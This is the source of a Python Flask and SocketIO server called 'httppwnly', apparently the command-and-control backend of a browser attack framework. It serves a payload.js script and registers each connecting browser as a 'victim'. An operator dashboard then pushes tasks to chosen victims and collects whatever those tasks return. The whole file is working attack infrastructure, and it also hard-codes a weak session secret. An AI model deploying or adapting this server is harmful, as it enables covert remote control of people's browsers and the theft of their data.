#!/usr/bin/env python
import argparse
from collections import OrderedDict
import logging
import random
import string


# Set this variable to "threading", "eventlet" or "gevent" to test the
# different async modes, or leave it set to None for the application to choose
# the best option based on available packages.
async_mode = None

from flask import Flask, render_template, session, request, Response, abort
from flask_socketio import SocketIO
# NOTE close_room, disconnect, join_room unused
# from flask_socketio import emit, join_room, leave_room, \
#     close_room, rooms, disconnect
# NOTE sqlite3 not used
# import sqlite3
from flask_sqlalchemy import SQLAlchemy
import datetime

from auth import SessionAuthenticator

# use: logger.debug("foo"), logger.info("bar"), logger.warn("OMG") etc.
logger = logging.getLogger('httppwnly')
logger.addHandler(logging.StreamHandler())
logger.setLevel(logging.INFO)

app = Flask(__name__)
app.config['SECRET_KEY'] = 'secret!'  # FIXME set to random.something()?
DATABASE = 'tasks.db'
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///'+DATABASE
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

db = SQLAlchemy(app)

socketio = SocketIO(app)

###
# authentication stuff

app.config['authenticator'] = SessionAuthenticator()
ADMIN_USER = 'admin'
_PASS_LEN = 12
# don't you love Stack Overflow: http://stackoverflow.com/a/2257449/204634
ADMIN_PASS = ''.join(random.SystemRandom().choice(string.ascii_letters + string.digits) for _ in range(_PASS_LEN))
logger.info(" :: Admin user: {} password: {} ::".format(ADMIN_USER, ADMIN_PASS))


def check_auth(auth):
    """Checks username and password match what was printed at startup"""
    if not hasattr(auth, 'username') or not hasattr(auth, 'password'):
        logger.debug("No 'username' or 'password' in authentication")
        return False
    logger.debug("Provided username: {} and password: {}".format(
        auth.username, auth.password))
    return auth.username == ADMIN_USER and auth.password == ADMIN_PASS


def do_auth(authenticator):
    """Sets a new session id in a cookie, and demands authentication"""
    # we add a sid to the storage every time a user hits this function
    session.new = True
    session['sid'] = authenticator.new_session()
    logger.debug("Set new session ID: {}".format(session['sid']))
    # yes, it's a bit of a waste. FIXME: add session lifetime and
    # every time the session storage is touched, remove the expired ones

    return Response(
        "Auth plz", 401,
        {'WWW-Authenticate': 'Basic realm="Login Required"'}
    )


def require_auth(f):
    """Wrapper to authenticate"""
    # could be reading the global object; but it's easy to move into a
    # separate module this way
    authenticator = app.config.get('authenticator')

    def wrapper(*args, **kwargs):
        # first, check username and password
        auth = request.authorization
        # inspired by: http://flask.pocoo.org/snippets/8/
        if not auth or not check_auth(auth):
            return do_auth(authenticator)

        # if it gets here username and pass are valid

        # TODO: this has to be set in the javascript library
        # (JQuery does it automatically)
        #
        # check whether the XmlHttpRequest header is set
        # if not request.is_xhr:
        #     logger.debug("No XHR baby")
        #     abort(401)

        # lastly, check whether the SID is valid
        sid = session.get('sid')
        if not authenticator.validate(sid):
            logger.debug("No joy")
            abort(401)

        logger.debug("All good mate")
        return f(*args, **kwargs)
    return wrapper

#
# auth stuff ends
###


class Task(db.Model):
    id = db.Column(db.Integer, primary_key=True, autoincrement=False)
    victim_id = db.Column(db.Text, db.ForeignKey('victim.id'), primary_key=True)
    input = db.Column(db.Text)
    output = db.Column(db.Text)
    status = db.Column(db.Text)
    created_time = db.Column(db.DateTime)
    victim = db.relationship('Victim',
        backref=db.backref('tasks', lazy='dynamic'))
    def __init__(self, victim, id,  input, output=None):
        self.id = id
        self.victim = victim
        self.input = input
        self.output = output
        self.status= "new"
        self.created_time = datetime.datetime.utcnow()
    def __repr__(self):
        return '<Task %r>' % self.id
    def _asdict(self):
        result = OrderedDict()
        for key in self.__mapper__.c.keys():
            result[key] = getattr(self, key)
        return result


class Victim(db.Model):
    id = db.Column(db.Text, primary_key=True, autoincrement=False)
    active = db.Column(db.Boolean)
    created_time = db.Column(db.DateTime)
    def __init__(self, id):
        self.id=id
        self.created_time = datetime.datetime.utcnow()
        self.active=True
    def __repr__(self):
        return '<Client %r>' % self.id 
    def _asdict(self):
        result = OrderedDict()
        for key in self.__mapper__.c.keys():
            result[key] = getattr(self, key)
        return result


db.drop_all()
db.create_all()


@app.route('/dashboard')
@require_auth
def dashboard():
    return render_template('dashboard.html')


@app.route('/payload.js')
def payloadjs():
    return open('payload.js').read()


@app.route('/includes.js')
def includesjs():
    return open('includes.js').read()


@socketio.on('task add', namespace='/dashboard')
def add_task(message): 
    victim = Victim.query.filter_by(id=message['victim']).first()
    max_id = Task.query.filter_by(victim = victim).order_by(Task.id.desc()).limit(1).all()
    #lame hack to reset task ids per victim:
    myid=0
    if len(max_id) == 0:
        myid = 1
    else:
        myid=max_id[0].id+1
    task = Task(victim,myid,message['input'])
    db.session.add(task)
    db.session.commit()
    socketio.emit('issue task',
                      {'id':task.id,'input':task.input},
                      namespace='/victim', room=victim.id)
    socketio.emit('issue task',
                      {'victim':victim.id,'id':task.id,'input':task.input},
                      namespace='/dashboard',include_self=False)
    socketio.emit('issue task self',
                      {'victim':victim.id,'id':task.id,'input':task.input},
                      namespace='/dashboard', room=request.sid)  
    print('[*] Task added: '+str(task.id))


@socketio.on('task output', namespace='/victim')
def task_output(message):
     victim = Victim.query.filter_by(id=request.sid).first()
     task = Task.query.filter_by(victim=victim,id=message['id']).first()
     if (task.output == None):
         task.output = str(message['output'])
     else:
         task.output=str(task.output)+'\n\n'+str(message['output'])
     db.session.commit()
     socketio.emit('task output',
                      {'victim':victim.id,'id':task.id,'output':task.output},
                      namespace='/dashboard')


@socketio.on('connect', namespace='/dashboard')
def dash_connect():
    outputlist = []
    victims = Victim.query.all()
    for victim in victims:
        tasklist = []
        tasks=Task.query.filter_by(victim=victim).all()
        for task in tasks:
            tasklist.append({'id':task.id,'input':task.input,'output':task.output})
        outputlist.append({'id':victim.id,'active':victim.active,'tasks':tasklist})
    emit('datadump', {'data': outputlist})
    print('[*] User connected: '+request.sid)


@socketio.on('connect', namespace='/victim')
def victim_connect():
    myvictim = Victim(request.sid)
    db.session.add(myvictim)
    db.session.commit()
    print('[*] Victim connected: '+myvictim.id)
    socketio.emit('victim connect',
                      {'id':myvictim.id,'active':myvictim.active},
                      namespace='/dashboard')


@socketio.on('disconnect', namespace='/dashboard')
def dash_disconnect():
    print('[*] User disconnected: '+request.sid)


@socketio.on('disconnect', namespace='/victim')
def victim_disconnect():
    myvictim = Victim.query.filter_by(id=request.sid).first()
    myvictim.active=False
    db.session.commit()
    socketio.emit('victim disconnect',
                      {'id':request.sid},
                      namespace='/dashboard')
    print('[*] Victim disconnected: '+request.sid)


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument("-d", "--debug", action='store_true')
    args = parser.parse_args()
    if args.debug:
        logger.setLevel(logging.DEBUG)
        logger.debug("Debug logging enabled")
    socketio.run(app)
